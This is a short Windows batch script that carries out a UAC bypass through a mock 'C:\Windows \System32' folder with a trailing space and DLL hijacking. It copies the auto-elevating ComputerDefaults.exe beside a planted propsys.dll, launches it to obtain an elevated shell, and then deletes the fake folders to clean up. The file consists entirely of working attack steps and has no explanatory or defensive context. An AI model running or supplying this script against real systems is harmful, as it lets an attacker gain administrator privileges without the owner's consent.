@echo off

mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\ComputerDefaults.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "propsys.dll" "C:\Windows \System32\"
"C:\Windows \System32\ComputerDefaults.exe"
echo  [-] Got Elevated Shell........ ?


@echo off
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32"
rmdir "C:\Windows \"
